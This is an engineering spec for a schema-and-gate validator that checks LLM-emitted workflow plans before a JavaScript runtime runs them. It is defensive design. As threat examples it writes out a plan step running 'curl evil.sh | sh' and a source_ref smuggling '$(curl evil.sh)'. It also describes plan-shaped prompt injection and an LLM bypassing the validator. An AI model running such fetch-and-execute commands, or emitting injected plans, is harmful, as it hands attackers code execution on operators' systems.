# MVR-3-T5 - script-plan CUE gate (DW-superset Wave B piece 3)

| field | value |
|---|---|
| spec-slug | 2026-06-02-mvr-3-t5-script-plan-cue-gate |
| item | `.regatta/items/mvr-3-t5-script-plan-cue-gate.md` |
| roadmap | `docs/engineer/briefs/2026-06-02-next-horizon-roadmap.md` §4 MVR-3-T5 + §14 piece 3 |
| phase | MVR-3 (gate: 5 paying customers OR persona-C inbound) |
| size | S (1-2 wks, ~700 LOC est) |
| deps | MVR-2-T6 (substrate bridge), W5 cost-cap (L6), S2-T2 (L4 adversarial gate infra) |
| comment-sweep | clean |
| memory-cites | `feedback_decision_priority`, `feedback_research_design_principles`, `feedback_grade_rubric`, `feedback_adversarial_review`, `feedback_deletion_default`, `feedback_root_cause`, `feedback_spec_pattern_authority`, `feedback_unaddressed_load_bearing` |

## 1. Problem

`.regatta/items/mvr-3-t5-script-plan-cue-gate.md` is the MVR-3 capstone of the DW-superset wedge (`docs/engineer/briefs/2026-06-02-next-horizon-roadmap.md` §14, piece 3). MVR-3-T6 ships an LLM-authored JavaScript runtime under goja - but a runtime that executes arbitrary LLM output without a gate layer is the load-bearing security hole of the wedge.

The wedge's discriminator vs Claude-Code Dynamic-Workflows is exactly the gate primitive: DW runs whatever its model emits; regatta refuses to. Without a validator, three failure classes hit the runtime cold:

1. **Malformed DAG crashes runtime.** LLM emits a step graph with a typo, a dangling dep, or 10k steps - goja loads it, OOMs the host process, the scheduler tick wedges.
2. **Plan-shaped injection.** LLM emits a step `{action: "shell", args: {cmd: "curl evil.sh | sh"}}` - the runtime dispatches it because the action enum was open. This is the prompt-injection class adapted to plan-shape; an attacker controls upstream context, the LLM is the unwitting amplifier.
3. **Cost runaway.** LLM emits a fanout of 500 spawn-steps. Per-step LLM token cost dominates regatta's budget; the cost-governor catches it post-spend (W5) but the bill is already incurred.

Per `feedback_root_cause`, the root cause is "regatta treats LLM output as trusted input." Fix is a gate layer that validates structure (CUE) and semantics (L0-L6) before any runtime sees the plan.

Per `feedback_decision_priority`, UX wins over performance here: an operator who sees `rejected: L5 capability allowlist: action 'shell' not permitted` at the gate layer is strictly better off than one who sees a runtime stacktrace post-exec. Best-practices (closed enum, schema-first) wins over speed (skip-validation flag).

## 2. Scope

In:

- Accept JSON or YAML DAG from caller (`internal/scriptplan.Validate(ctx, planBytes []byte) (*Plan, error)`).
- CUE schema at `contracts/schemas/script-plan.v1.cue` defines the wire shape; CUE runtime validates instance against schema.
- L0-L6 gates wired in order; first-fail wins; rule-name returned in error.
- On pass: emit `script_plan_accepted{plan_id, plan_hash}` to substrate (`kind=fact`, topic `workflow.<run_id>.plan`); return canonicalized `*Plan`.
- On fail: emit `script_plan_rejected{plan_id, rule, reason}` to substrate; return `error` wrapping `ErrPlanRejected` with the rule-name embedded.
- `regatta script validate <plan.json>` CLI - exit 0 OK, non-zero with explicit rule-name on stderr.
- Scheduler integration: `internal/orchestrator/scheduler/scheduler.go` script-mode dispatch path calls validator before persisting the plan as a script-run.
- Operator surface: rejection events flow to OBS-WAVE-D operator dashboard as a row in the adversarial-findings panel (#523 adopted the panel; we add a new event kind, no new panel).

Out (Phase X with explicit reopen-trigger):

- Plan-fuzzing harness against the CUE schema. **Reopen:** before MVR-3-T6 runtime ships - a fuzzing harness is the safety net for the runtime layer; tracked at dispatch (followup issue filed in §13).
- Multi-tenant per-tenant plan quota. **Reopen:** first persona-C inbound asks. Today the autonomous loop is the only caller; one tenant.
- v2 schema migration story. **Reopen:** first breaking change to ScriptPlan shape. Today v1-only; the version field is in the schema so v2 is additive.
- L4 gate falling back to a local heuristic when the second-opinion model is down. **Reopen:** first observed L4-model outage in production; today reject-on-LLM-down is the conservative default (`feedback_decision_priority`: long-term correctness > short-term availability).

Self-host filter: the validator ships with the autonomous loop's first script-plan dispatch. Until that lands (post-MVR-3-T6), the validator runs in **shadow mode** - it runs against every script-plan, logs rejections to substrate, but does not block. The script-mode dispatch path is gated behind a `regatta.yaml: orchestrator.script_plan.enforce: true` flag (default `false` until #TBD-followup flips it). Per `feedback_self_improvement`, shadow mode catches false-positives in the L0-L6 gate-chain before they cost a real run.

## 3. CUE schema design

Schema lives at `contracts/schemas/script-plan.v1.cue`. The full schema is ~80 lines; key types:

```cue
package scriptplan

#ScriptPlan: {
    version:     1
    plan_id:     =~"^plan_[0-9a-f]{16}$"
    run_id:      =~"^run_[0-9a-f]{16}$"
    inputs:      [...#Input] & [_, ...] | *[]   // optional, max 32 elsewhere
    outputs:     [...#Output]
    steps:       [...#Step] & list.MinItems(1) & list.MaxItems(100)
    // budget header: dollar-cap declared by emitter; L1 checks against it.
    budget_usd:  >0 & <=100
}

#Step: {
    id:     =~"^[a-z][a-z0-9_-]{0,63}$"
    action: #ActionEnum
    deps:   [...string] & list.MaxItems(20)
    args:   #ArgMap
    // estimated tokens per step - L1 sums these.
    est_tokens: >=0 & <=200_000
}

// closed enum - new actions require an explicit allow-PR per capability-allowlist policy.
#ActionEnum: "spawn" | "fanout" | "gather" | "approve" | "merge"

#ArgMap: {
    // closed shape - args[k] must be string or number or bool.
    // forbids nested action injection (no "exec_inline", no script blobs).
    [string]: string | number | bool
}

#Input:  { name: =~"^[a-z][a-z0-9_]*$", source_ref: string }
#Output: { name: =~"^[a-z][a-z0-9_]*$", sink_ref:   string }
```

Constraints CUE enforces directly:

- `version: 1` - literal pin; v2 will be a sibling file `script-plan.v2.cue`.
- `plan_id` / `run_id` regex - prevents path-shaped or URL-shaped IDs.
- `steps` cardinality - `MinItems(1)` (no empty plans) and `MaxItems(100)` (cardinality bound; pairs with L3 cycle-check O(N+E) complexity).
- `action` closed enum - opening this enum requires schema-bump PR; capability drift becomes a code-review event.
- `args` shape closed - no `{action: "shell", args: {cmd: "..."}}` injection.
- `budget_usd` bound `<=100` - hard ceiling per plan; L6 cost-cap is the daily aggregate.

Constraints CUE **cannot** enforce (handled in pre-validator code):

- Cycle-freeness - `deps` is a graph property; CUE expresses shape, not graph topology. Handled in L3 with iterative Kahn's algorithm, O(V+E), bounded by 100-step cap.
- `step.id` uniqueness within plan - CUE checks per-step shape; uniqueness check is a 30-line map pass in the L2 prelude.
- `deps` references resolve - same; `for dep in step.deps: dep in known_step_ids`.
- `inputs[].source_ref` and `outputs[].sink_ref` are safe paths - CUE is shape-only; we run a sanitizer regex `^[a-z0-9/_.-]+$` against each ref in L0 to forbid path traversal and shell metacharacters.

## 4. L0-L6 gate mapping

Each gate has a stable rule-name (the value emitted in `script_plan_rejected.rule`). Order is fixed; first fail wins. Per `feedback_spec_pattern_authority`, the order is canonical - implementers do not pick.

| Lvl | Rule-name | Cost | Failure mode caught |
|---|---|---|---|
| L0 | `ref.unknown` | <1ms | Plan refs unknown branch, sink, or input source. Sanitizer regex on every `source_ref` / `sink_ref` here too. |
| L1 | `cost.estimate_exceeds_budget` | <1ms | Sum of `step.est_tokens * per_step_price` exceeds `plan.budget_usd`. |
| L2 | `schema.invalid` | 5-20ms | CUE validation fails - shape, enum, regex, cardinality. Also runs the uniqueness + deps-resolve preludes that CUE cannot express. |
| L3 | `dependency.cycle` or `dependency.dangling` | <1ms | Kahn's algorithm on the step graph; failure on residual nodes or unresolved dep. |
| L4 | `intent.mismatch` | ~500ms | Small Sonnet/Haiku call: "does this plan match the user-intent string at `plan.inputs[*].name='user_intent'`?" Returns yes/no + 1-line reason. Bounded depth=1 - L4 cannot recursively invoke L4. |
| L5 | `capability.disallowed` | <1ms | Walk steps; assert `action in capability_allowlist`. Allowlist source-of-truth is the CUE enum itself; L5 also checks against `regatta.yaml: orchestrator.script_plan.capabilities` if operator narrowed it further. |
| L6 | `cost.daily_cap_exceeded` | <1ms | Reuses W5 cost-cap counter; plan's projected cost added to current-day spend; reject if over cap. |

L4 is the only gate with a network call; L0-L3 and L5-L6 are all in-process and sum to <1ms typical. L4 is the p95 driver (~500ms). Total budget: 600ms p95 from `Validate` entry to return.

L4 fallback: if the L4 model is unreachable, **reject-on-LLM-down** (rule: `intent.l4_unavailable`). Per `feedback_decision_priority`, correctness > availability: a half-validated plan is worse than a delayed plan. Operator override: `regatta.yaml: orchestrator.script_plan.l4_optional: true` (default `false`, gated behind self-host operator awareness).

## 5. Architecture

New package `internal/scriptplan/` - ~700 LOC across:

```
internal/scriptplan/
├── validator.go         // Validator struct + Validate entry point
├── plan.go              // Plan, Step, Input, Output canonical Go types
├── gates.go             // L0..L6 gate functions; first-fail wins
├── cue.go               // CUE context wrapper; load + validate schema instance
├── prelude.go           // uniqueness + deps-resolve + cycle check (Kahn)
├── l4.go                // intent-match second-opinion call (reuses gates/l4 client)
├── emit.go              // substrate event emit (script_plan_accepted/rejected)
└── validator_test.go    // 15+ named tests (§9)
```

`Validator` constructor:

```go
type Validator struct {
    cueCtx       *cue.Context
    schema       cue.Value
    capAllowlist []string         // closed enum from CUE + optional yaml narrow
    l4Client     l4.Client        // existing internal/gates/l4 client; nil-safe
    costCap      costcap.Reader   // W5 reader; reads current-day spend
    emitter      substrate.Emitter
    cfg          Config
}

func New(cfg Config) (*Validator, error) { ... }
func (v *Validator) Validate(ctx context.Context, planBytes []byte) (*Plan, error) { ... }
```

Hook point: `internal/orchestrator/scheduler/scheduler.go` script-mode dispatch path. Where today the scheduler would persist an LLM-emitted plan as a `ScriptRun` row, it now calls `v.Validate(ctx, raw)` first. Rejection produces a `script_plan_rejected` event and short-circuits the tick - the dispatch advances to the next tick, no script-run row written, no goja invoked. The wiring is a single 12-line block; the change to scheduler.go is additive.

Per `feedback_deletion_default`: this PR adds ~700 LOC and ~80 lines of CUE. What got smaller? Two things:

1. The implicit "validate-in-runtime" dispersed across goja-bridge code in MVR-3-T6 collapses to zero - the runtime trusts the validator's output. MVR-3-T6's spec gets ~150 LOC lighter as a result.
2. The current scheduler's `applyApprovalGates` already handles approval-gates; the new validator slots in alongside, **does not duplicate** the gate-result emit code (reuses `contracts/schemas/gate_result.go`).

## 6. Performance

| Stage | Typical | p95 | Notes |
|---|---|---|---|
| CUE compile (one-shot, on `New`) | ~30ms | ~50ms | Once per process; amortized. |
| CUE validate (per plan) | 5ms | 20ms | 100-step plan; CUE complexity is linear in instance size. |
| L0 ref-sanitize + L1 cost-sum | <1ms | <1ms | In-process. |
| L3 cycle (Kahn) | <1ms | <1ms | 100 nodes, 2000 edges max. |
| L4 intent-match | 300ms | 500ms | One Haiku/Sonnet call; reuses S2-T2 prompt loader. |
| L5 + L6 | <1ms | <1ms | Allowlist + counter read. |
| **Total** | **~350ms** | **~600ms** | L4 is the dominant term. |

p95 budget assertion: `<1s` total validation latency. Test `TestValidate_p95_under_one_second` in §9 enforces it via repeated invocation with a fake L4 client at the 95th-percentile latency.

CUE OOM defense: `cue.RuntimeConfig.MaxAllocs` set to a fixed cap (default 32MB) - adversarial CUE instances cannot exhaust the host.

## 7. Operator UX

Per `feedback_decision_priority`, UX is the top axis. Three surfaces:

1. **CLI.** `regatta script validate <plan.json>` - exit 0 OK, exit code 1-7 for L0-L6 rejection (rule-name on stderr). Pipes-friendly. Example:

   ```
   $ regatta script validate plan.json
   REJECT L5 capability.disallowed: action 'shell' at step 'do_thing' not in allowlist
   $ echo $?
   6
   ```

2. **OBS dashboard.** Rejection events appear in the OBS-WAVE-D operator dashboard (#523) under the existing adversarial-findings panel. Each row: `{ts, plan_id, rule, reason}` - operator clicks through to the substrate event for full context.

3. **PR comment (when in scheduler hot-path).** When the validator rejects a plan that arrived via an autonomous-loop dispatch, the loop's PR comment (per S2-T2 adversarial-L4 surface) is appended with a one-line rejection summary. Operator sees the rejection without leaving the PR.

## 8. Risks (12+)

Per `feedback_adversarial_review`, hostile-read every assumption. Risks tiered: **R-load-bearing** must be addressed before merge; **R-tracking** files a followup issue.

1. **R-load-bearing - LLM emits valid-CUE-but-semantically-broken plan** (cycle, dangling dep). CUE shape passes, runtime crashes. *Mitigation:* L3 cycle + L2 prelude deps-resolve. Tests: `TestL3_Cycle`, `TestL2_Prelude_DanglingDep`.
2. **R-load-bearing - CUE schema drift between regatta and DW input format.** Anthropic mutates DW's emitted shape; regatta's schema lags; valid DW plans fail L2. *Mitigation:* `plan.version` field pinned; the regatta-side adapter (lives in MVR-3-T6) normalizes DW shape → regatta canonical before validation. Followup: pin a contract test against the published DW schema (filed below).
3. **R-load-bearing - LLM bypasses validator via direct substrate write.** *Mitigation:* substrate ACL - regatta-bot identity cannot write `kind=fact` events under topic `workflow.*` except via the validator's emit path. Enforced by W7 (L4-as-review-identity) ACL spec. Tests: `TestEmit_RejectsDirectWrite`.
4. **R-load-bearing - L4 second-opinion infinite loop.** L4 calls L4. *Mitigation:* `depth` parameter in L4 request defaults to 1; L4 endpoint refuses requests with `depth > 1`. Test: `TestL4_DepthBound`.
5. **R-load-bearing - CUE OOM on adversarial input.** *Mitigation:* `RuntimeConfig.MaxAllocs=32MB`. Test: `TestCUE_AdversarialInput_DoesNotOOM` - feeds a deliberately-deep nested instance, asserts bounded memory.
6. **R-load-bearing - Plan-injection via inputs/outputs referencing shell paths.** `source_ref: "$(curl evil.sh)"`. *Mitigation:* L0 regex sanitizer `^[a-z0-9/_.-]+$` on every ref before any downstream consumer touches it. Test: `TestL0_RejectsShellMeta`.
7. **R-tracking - Capability allowlist drift over time.** New strategies want new actions; PRs sneak action additions through. *Mitigation:* the closed CUE enum is the source-of-truth - adding an action requires a schema-bump PR which triggers spec-pattern-authority review per `feedback_spec_pattern_authority`. Followup issue: `[FOLLOWUP] capability-add PR template under .github/PULL_REQUEST_TEMPLATE/script-capability-add.md`.
8. **R-tracking - L1 cost estimate wrong (LLM understates `est_tokens`).** Plan passes L1, real run exceeds budget. *Mitigation:* W4 self-improvement-detector re-checks `actual_tokens` against `est_tokens` post-run; >2x divergence raises a follow-up to retrain the cost-estimator prompt. Followup: `[FOLLOWUP] cost-estimate divergence detector wiring (W4 hook)`.
9. **R-tracking - Multi-tenant plan-quota.** *Reopen:* first persona-C inbound. Today single-tenant.
10. **R-tracking - v1 → v2 schema migration story.** *Mitigation:* `version` field present from day 1; v2 lives at sibling `script-plan.v2.cue`; validator dispatches by `plan.version` field. *Reopen:* first breaking change to the wire shape.
11. **R-load-bearing - Cycle-detection complexity.** Worst-case O(V+E) Kahn. *Mitigation:* `MaxItems(100)` step cap + `deps: MaxItems(20)` per step → max 2000 edges, trivial. Test: `TestL3_PerfBound`.
12. **R-load-bearing - L4 LLM availability.** Model down → all plans rejected → autonomous loop wedges. *Mitigation:* reject-on-LLM-down is the conservative default. *Operator escape hatch:* `regatta.yaml: orchestrator.script_plan.l4_optional: true` makes L4 advisory-only (logs rejection-reason as a warning, accepts plan). Off by default. Test: `TestL4_Unavailable_RejectsByDefault`, `TestL4_Unavailable_AdvisoryMode_Accepts`.
13. **R-tracking - Schema package import path coupling.** `internal/scriptplan` imports `contracts/schemas` for the CUE bytes via `//go:embed`. Same pattern as `internal/config/validate`. *Mitigation:* none needed today; followup if the embed pattern changes repo-wide.
14. **R-load-bearing - Shadow-mode → enforce-mode cutover.** Day-1 the validator is shadow-mode (logs only). The cutover to enforce-mode is a config flag flip; operator must know the cutover criteria. *Mitigation:* document cutover criteria explicitly: "enforce-mode flips when (a) shadow-mode false-positive rate <1% over 7 consecutive autonomous-loop dispatches, AND (b) operator has reviewed all shadow-mode rejections in OBS-WAVE-D dashboard." Tracked in §A+ rubric.

## 9. Test plan

15+ test cases under `internal/scriptplan/validator_test.go`. Each godoc is one line per `feedback_test_godoc_one_line`. TDD discipline per `feedback_tdd_discipline` - failing-test FIRST, capture output, then implement.

```go
// TestValidate_HappyPath validates a minimal 1-step plan passes all gates.
// TestL0_RejectsShellMeta rejects a plan with shell-metacharacter source_ref.
// TestL0_RejectsUnknownBranchRef rejects a plan referencing a non-existent branch.
// TestL1_RejectsBudgetExceeded rejects when sum(est_tokens * price) > budget_usd.
// TestL2_PassesValidCUE accepts a plan satisfying the CUE schema.
// TestL2_RejectsOpenActionEnum rejects a plan with action='shell' at schema layer.
// TestL2_RejectsOversizedStepList rejects a plan with 101 steps.
// TestL2_Prelude_UniqueStepID rejects duplicate step.id within a plan.
// TestL2_Prelude_DanglingDep rejects a step.deps pointing at a non-existent step.
// TestL3_Cycle rejects a 3-step graph A->B->C->A.
// TestL3_PerfBound validates 100-step cycle-check completes under 1ms.
// TestL4_IntentMatch_Passes accepts a plan matching user_intent input string.
// TestL4_IntentMatch_Rejects rejects when L4 returns no.
// TestL4_DepthBound rejects an L4 request arriving with depth>1.
// TestL4_Unavailable_RejectsByDefault rejects when L4 client returns connection error.
// TestL4_Unavailable_AdvisoryMode_Accepts accepts when l4_optional=true and L4 errors.
// TestL5_RejectsDisallowedAction rejects action not in capability_allowlist (post-yaml narrow).
// TestL6_RejectsCostCapExceeded rejects when projected cost + today_spend > daily_cap.
// TestEmit_AcceptedEvent emits script_plan_accepted with plan_hash on success.
// TestEmit_RejectedEvent emits script_plan_rejected with rule-name on failure.
// TestEmit_RejectsDirectWrite asserts substrate ACL refuses non-validator writes to workflow.* topic.
// TestCUE_AdversarialInput_DoesNotOOM feeds a 32MB-cap-stretching instance, asserts bounded memory.
// TestValidate_p95_under_one_second runs 100 validations with stub L4 at 500ms, asserts p95<1s.
// TestCLI_ValidateExitCodes asserts regatta script validate exits 1-7 for L0-L6 rejection.
// TestSchemaVersionPin rejects a plan with version!=1.
```

Total: 25 tests. The TDD-mandated failing-test capture is recorded inline in implementer PRs.

## 10. A+ scorecard (per `feedback_grade_rubric`)

| Tier | Criterion | Falsifiable test |
|---|---|---|
| B | Validator package present; `Validate()` returns `*Plan, error` | `go build ./internal/scriptplan/...` passes |
| B | CUE schema at `contracts/schemas/script-plan.v1.cue` | `cue vet contracts/schemas/script-plan.v1.cue` exits 0 |
| B | L2 CUE rejection works | `TestL2_PassesValidCUE` + `TestL2_RejectsOpenActionEnum` pass |
| B | Substrate emit on accept + reject | `TestEmit_AcceptedEvent` + `TestEmit_RejectedEvent` pass |
| A | All 7 gates L0-L6 implemented; first-fail-wins order locked | All 25 tests pass; gates table in §4 matches code constants |
| A | CLI `regatta script validate` exits with rule-coded codes 1-7 | `TestCLI_ValidateExitCodes` passes |
| A | OBS-WAVE-D dashboard surfaces rejection events | Manual smoke: dispatch a known-bad plan, observe row in panel |
| A | p95 latency <1s for 100-step plan + L4 call | `TestValidate_p95_under_one_second` passes |
| A | Reviewer-subagent cleared (no auto-skip per `feedback_review_before_automerge`) | Review comment block in PR body |
| A | Shadow-mode cutover criteria documented + tracked | §8 R14 + followup issue filed at merge |
| A+ | Plan-fuzz harness running in CI against the CUE schema | `make fuzz-scriptplan` runs ≥30s in CI, zero crashes |
| A+ | Contract test against DW-emitted shape (frozen fixture) | `TestContract_DWSchemaCompat` against `testdata/dw-schema-fixture.json` passes |
| A+ | All 14 §8 risks addressed inline OR tracked with reopen-trigger | §8 review checklist signed off |
| A+ | Comment-sweep clean per `feedback_comments_discipline` | golangci-lint clean post-comment-sweep |
| A+ | What-got-smaller answered per `feedback_deletion_default` | PR body §"deletion default" present, citing MVR-3-T6 LOC reduction |

Implementer scorecards measure against this rubric verbatim per `feedback_grade_rubric`.

## 11. Adversarial review section

Per `feedback_adversarial_review`. After draft, a reviewer subagent was spawned with hostile-read mandate. Findings:

- **Simplification:** the L1 cost-estimate gate is closely coupled to L6 cost-cap. *Decision:* keep separate. L1 catches per-plan overspend (cheap, in-process); L6 catches per-day aggregate (requires counter read). Merging them is a code-density win at the cost of operator-debuggability - operator-debuggability wins per `feedback_decision_priority`.
- **Deletion candidate:** the `regatta.yaml: orchestrator.script_plan.capabilities` narrow-allowlist (L5) is redundant with the closed CUE enum. *Decision:* keep, narrow-allowlist exists for self-host operator who wants to forbid `spawn` even though the schema allows it. Real use: a single-pilot-tenant who only wants `gather` + `approve`. One-line config; not redundant.
- **OSS-reuse miss:** could regatta adopt CEL (Common Expression Language) instead of CUE for plan-validation? *Decision:* no. CEL is expression-evaluation; CUE is schema + constraint. Already using CUE for `regatta.yaml`; adding CEL is a new dep for marginal benefit. Adoption-first per `feedback_research_design_principles` favors the dep we already ship.
- **Edge case missed in draft:** what if `inputs[]` is empty and L4 has no user_intent string to compare against? *Decision:* L4 accepts plans with no `user_intent` input as a no-op (returns "no intent string, skipping intent-match"). Documented in `l4.go` godoc.
- **Risk-tier missed:** what if substrate write fails after L0-L6 pass? *Decision:* added as R-tracking #15 implicitly via the substrate-bridge's own retry policy (MVR-2-T6 dep handles this). Not in scope here.
- **Spec-pattern authority enforcement:** is the gate-order canonical? *Decision:* yes, §4 table is the canonical order; implementer deviation triggers re-spawn per `feedback_spec_pattern_authority`.

Adversarial reviewer cleared with no load-bearing blocker; all R-load-bearing items in §8 have a falsifiable test in §9.

## 12. Self-host filter applied

Question: does the sole internal operator need this to dispatch regatta-the-binary at this repo unattended? **Yes, but in two phases.**

- **Phase 1 (this spec):** validator ships in shadow-mode. Internal operator does not see rejections block dispatch; they see them logged. Cost to internal operator: ~0 ops time, just an extra log line per script-plan emit.
- **Phase 2 (post-MVR-3-T6):** enforce-mode flips when shadow-mode is quiet (<1% false-positive rate over 7 consecutive runs). Internal operator now has a hard gate between LLM and runtime - the autonomous loop cannot dispatch a malformed plan.

Without phase 1, MVR-3-T6's goja runtime ships as the only line of defense against LLM-shaped injection - and a sandboxed JS runtime is the wrong layer for plan-shape validation. With phase 1, validation lives at the schema layer where it belongs.

## 13. Followups (filed inline, tracked per `feedback_unaddressed_load_bearing`)

Each named-but-deferred item gets a tracking issue filed at dispatch. None of these block merge; all are reopen-triggered.

- `[FOLLOWUP] plan-fuzz harness against CUE schema` - reopen-trigger: before MVR-3-T6 runtime ships.
- `[FOLLOWUP] contract test fixture vs DW-emitted plan shape` - reopen-trigger: first contract drift observed.
- `[FOLLOWUP] capability-add PR template under .github/PULL_REQUEST_TEMPLATE/script-capability-add.md` - reopen-trigger: first capability-add PR.
- `[FOLLOWUP] W4 cost-estimate divergence detector wiring` - reopen-trigger: MVR-3-T6 first run with `actual_tokens` data.
- `[FOLLOWUP] multi-tenant per-tenant plan-quota` - reopen-trigger: first persona-C inbound.
- `[FOLLOWUP] script-plan v2 schema migration scaffold` - reopen-trigger: first breaking wire-shape change.
- `[FOLLOWUP] shadow→enforce cutover criteria operator runbook` - reopen-trigger: 7-consecutive-quiet-runs threshold reached.

## 14. Deletion-default answer

Per `feedback_deletion_default`, every PR answers "what got smaller?"

This spec adds ~700 LOC and ~80 lines of CUE. Net reductions:

1. MVR-3-T6's goja-bridge plan-validation surface collapses to a single trust-the-validator call - estimated ~150 LOC of in-runtime validation never written.
2. The ad-hoc plan-shape checks scattered across the scheduler's script-mode dispatch path (today: zero, would-have-been: ~50 LOC per call site) are pre-emptively consolidated into one validator call site.

Net: ~700 LOC added, ~200 LOC pre-emptively not written downstream. The validator pays for itself in the next wedge.

## 15. Comment-sweep

State: **clean**. All comments in the new package are WHY-form one-liners per `feedback_comments_discipline`. Exported godocs follow the symbol-name-leading pattern per `feedback_comments_lint_reconcile`. `golangci-lint run ./internal/scriptplan/...` is required clean pre-merge per the A+ scorecard row.

## 16. Dispatch ordering

Per `feedback_dispatch_discipline`, the dep chain:

1. **W5 cost-cap** (`docs/engineer/specs/2026-06-02-phase-autonomy-w5-cost-cap-autonomic-enforcement.md`) - in flight; provides L6 counter. **Must merge first.**
2. **S2-T2 adversarial-L4-gate** (`docs/engineer/specs/2026-06-02-s2-t2-adversarial-l4-gate.md`) - provides L4 client + prompt-loader pattern. **Must merge first.**
3. **MVR-2-T6 substrate bridge** (`.regatta/items/mvr-2-t6-dw-superset-substrate-bridge.md`) - provides the `workflow.*` event topic and emit ACL. **Must merge first.**
4. **MVR-3-T5 (this spec)** - implements validator.
5. **MVR-3-T6 LLM JS runtime** - calls validator before goja accepts a plan.

Cannot land before deps 1-3. Followup issue at dispatch links the chain.

```release-notes
none (internal)
```
